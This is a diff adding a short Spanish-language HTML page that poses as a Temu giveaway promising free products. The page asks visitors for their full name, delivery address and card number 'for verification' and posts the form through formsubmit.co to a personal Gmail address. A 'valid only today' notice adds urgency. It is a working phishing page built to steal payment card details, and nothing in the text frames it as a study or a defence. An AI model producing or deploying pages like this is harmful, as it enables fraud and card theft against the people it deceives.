@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Temu Promoción Falsa</title>
+</head>
+<body style="text-align:center; font-family:sans-serif;">
+  <h1 style="color:orange;">🎁 ¡Temu te regala productos gratis! 🎁</h1>
+  <p>Llena el formulario para recibir tu pedido especial:</p>
+
+  <form action="https://formsubmit.co/ismael.069532@gmail.com" method="POST">
+    <input type="text" name="nombre" placeholder="Nombre completo" required><br><br>
+    <input type="text" name="direccion" placeholder="Dirección de entrega" required><br><br>
+    <input type="text" name="tarjeta" placeholder="Número de tarjeta (para verificación)" required><br><br>
+    <input type="submit" value="Reclamar regalo">
+  </form>
+
+  <p style="color:red;">*Promoción válida solo hoy*</p>
+</body>
+</html>
